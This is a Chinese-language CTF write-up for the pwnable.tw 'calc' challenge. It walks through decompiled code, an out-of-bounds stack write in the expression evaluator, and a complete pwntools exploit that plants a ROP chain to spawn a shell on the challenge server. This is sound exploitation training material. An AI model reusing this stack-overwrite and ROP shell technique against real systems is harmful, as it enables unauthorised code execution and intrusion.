---

title: pwnable.tw WriteUp - calc
lang: zh
layout: article
show_subscribe: false
tags: [ctf,pwn]

---

[calc题目链接](https://pwnable.tw/challenge/#3)

## calc

比较好的题。

对程序逆向工程可以看出是一个计算器。

下面是几个关键函数的反编译代码：

### main 函数

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  ssignal(14, timeout);
  alarm(60);
  puts("=== Welcome to SECPROG calculator ===");
  fflush(stdout);
  calc();
  return puts("Merry Christmas!");
}
```

主要工作就是调用 `calc` 函数。 `alarm` 函数是设置时间发送信号。

### calc 函数:

```cpp
unsigned int calc()
{
  numarry res; // [esp+18h] [ebp-5A0h] BYREF
  int buffer[256]; // [esp+1ACh] [ebp-40Ch] BYREF
  unsigned int v3; // [esp+5ACh] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  while ( 1 )
  {
    bzero(buffer, 1024u);
    if ( !get_expr((int)buffer, 1024) )         // +12345 Segmentation fault
      break;
    init_pool(&res);
    if ( parse_expr(buffer, &res) )
    {
      printf("%d\n", res.num[res.cnt - 1]);     // +361 for return address
      fflush(stdout);
    }
  }
  return __readgsdword(0x14u) ^ v3;
}
```

其中 `res` 结构体变量声明长这样：

```cpp
struct numarry
{
  int cnt;
  int num[100];
};
```

`bzero` , `init_pool` 函数都是置 0 函数。 `get_expr` 函数每次只读一个字符，读入只能是数字或者 `+,-,*,%,/` 。 

### parse_expr

关键分析函数

反编译代码差不多长这样。

```cpp
int __cdecl parse_expr(int *bufferaddr, numarry *resarrayaddr)
{
  int v3; // eax
  int *numstartaddr; // [esp+20h] [ebp-88h]
  int i; // [esp+24h] [ebp-84h]
  int stktop; // [esp+28h] [ebp-80h]
  int numlen; // [esp+2Ch] [ebp-7Ch]
  char *numstrheap; // [esp+30h] [ebp-78h]
  int numstr2int; // [esp+34h] [ebp-74h]
  char symbolstack[100]; // [esp+38h] [ebp-70h] BYREF
  unsigned int v11; // [esp+9Ch] [ebp-Ch]

  v11 = __readgsdword(0x14u);
  numstartaddr = bufferaddr;
  stktop = 0;
  bzero(symbolstack, 100u);
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)(*((char *)bufferaddr + i) - 48) > 9 )// if calc symbol
    {
      numlen = (char *)bufferaddr + i - (char *)numstartaddr;
      numstrheap = (char *)malloc(numlen + 1);
      memcpy(numstrheap, numstartaddr, numlen);
      numstrheap[numlen] = 0;
      if ( !strcmp(numstrheap, "0") )
      {
        puts((int)"prevent division by zero");
        fflush(stdout);
        return 0;
      }
      numstr2int = atoi((int)numstrheap);
      if ( numstr2int > 0 )
      {
        v3 = resarrayaddr->cnt++;
        resarrayaddr->num[v3] = numstr2int;
      }
      if ( *((_BYTE *)bufferaddr + i) && *((char *)bufferaddr + i + 1) - (unsigned int)'0' > 9 )// 符号下一个是不是数字
      {
        puts((int)"expression error!");
        fflush(stdout);
        return 0;
      }
      numstartaddr = (int *)((char *)bufferaddr + i + 1);
      if ( symbolstack[stktop] )
      {
        switch ( *((_BYTE *)bufferaddr + i) )
        {
          case '%':
          case '*':
          case '/':
            if ( symbolstack[stktop] != '+' && symbolstack[stktop] != '-' )
              goto LABEL_14;
            symbolstack[++stktop] = *((_BYTE *)bufferaddr + i);
            break;
          case '+':
          case '-':
LABEL_14:
            eval(resarrayaddr, symbolstack[stktop]);
            symbolstack[stktop] = *((_BYTE *)bufferaddr + i);
            break;
          default:
            eval(resarrayaddr, symbolstack[stktop--]);
            break;
        }
      }
      else
      {
        symbolstack[stktop] = *((_BYTE *)bufferaddr + i);
      }
      if ( !*((_BYTE *)bufferaddr + i) )
        break;
    }
  }
  while ( stktop >= 0 )
    eval(resarrayaddr, symbolstack[stktop--]);
  return 1;
}
```

#### eval函数


```cpp
numarry *__cdecl eval(numarry *numarrayaddr, char symbol)
{
  numarry *result; // eax

  if ( symbol == '+' )
  {
    numarrayaddr->num[numarrayaddr->cnt - 2] += numarrayaddr->num[numarrayaddr->cnt - 1]; // vulnerability!!!
  }
  else if ( symbol > '+' )
  {
    if ( symbol == '-' )
    {
      numarrayaddr->num[numarrayaddr->cnt - 2] -= numarrayaddr->num[numarrayaddr->cnt - 1];
    }
    else if ( symbol == '/' )
    {
      numarrayaddr->num[numarrayaddr->cnt - 2] /= numarrayaddr->num[numarrayaddr->cnt - 1];
    }
  }
  else if ( symbol == '*' )
  {
    numarrayaddr->num[numarrayaddr->cnt - 2] *= numarrayaddr->num[numarrayaddr->cnt - 1];
  }
  result = numarrayaddr;
  --numarrayaddr->cnt;
  return result;
}
```

类似于数据结构中双栈求值。分析到这里,大概逻辑是懂了。



### 试一下一些不正常的输入

```bash
z1933@1933:~/workplace/vbshare/ctf 
$ ./calc 
=== Welcome to SECPROG calculator ===
+1
1
+123
0
+1234 
0
+12345 
Segmentation fault (core dumped)

```


**段错误分析**

当输入 `+12345` 时，调试会发现 eval 函数中一来的 '+' 号判断 :

```cpp
if ( symbol == '+' )
{
  numarrayaddr->num[numarrayaddr->cnt - 2] += numarrayaddr->num[numarrayaddr->cnt - 1];
}
```

数组会越界，写到 `numarry` 结构中的 cnt 去。

也就是说我们可以通过类似 `+` 然后一个数字控制 `numarry` 结构体中的 cnt 成员。

然后 `parse_expr` 函数中又有

```cpp
      if ( numstr2int > 0 )
      {
        v3 = resarrayaddr->cnt++;
        resarrayaddr->num[v3] = numstr2int;
      }
```

**所以公式 `+[offset]+vaule` 就可以在栈上写任意值!**

但注意写的值不能溢出 int ，因为 `if ( numstr2int > 0 )` 这一个判断。

因为开了 nx 保护，所以在栈上写 gadgets 进行 ROP 攻击。 下面用的 gadgets 是用 [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) 工具生成的。

```
z1933@1933:~/workplace/vbshare/ctf 
$ ROPgadget --binary ./calc --ropchain
```

## exploit：

gadgets 是倒着写进去的。因为 eval 函数会 `numarrayaddr->num[numarrayaddr->cnt - 2] += numarrayaddr->num[numarrayaddr->cnt - 1];` 。


```python
#!/usr/bin/env python3
from struct import pack
from pwn import *

HOST='chall.pwnable.tw'
PORT=10100
PROC="./calc"

io=None

if len(sys.argv) == 1 : 
    io=process(PROC)
else:
    log.info("remote start")
    # 设置代理
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote(HOST,PORT)


def sendline(line,num):
    io.sendline("+{}+{}".format(line,num))
    line-=1

gadgets=[0x080701aa # pop edx ; ret
,0x080ec060 # @ .data
,0x0805c34b # pop eax ; ret
,u32(b'/bin')
,0x0809b30d # mov dword ptr [edx], eax ; ret
,0x080701aa # pop edx ; ret
,0x080ec064 # @ .data + 4
,0x0805c34b # pop eax ; ret
,u32(b'//sh')
,0x0809b30d # mov dword ptr [edx], eax ; ret
,0x080701aa # pop edx ; ret
,0x080ec068 # @ .data + 8
,0x080550d0 # xor eax, eax ; ret
,0x0809b30d # mov dword ptr [edx], eax ; ret
,0x080481d1 # pop ebx ; ret
,0x080ec060 # @ .data
,0x080701d1 # pop ecx ; pop ebx ; ret
,0x080ec068 # @ .data + 8
,0x080ec060 # padding without overwrite ebx
,0x080701aa # pop edx ; ret
,0x080ec068 # @ .data + 8
,0x080550d0 # xor eax, eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x0807cb7f # inc eax ; ret
,0x08049a21 # int 0x80
]

io.recvline()

gadgets.reverse()

# 倒着写到栈里面去
line=360+len(gadgets)-1
for i in gadgets: 
    sendline(line,i)
    line-=1

io.sendline('a')

io.interactive()
```

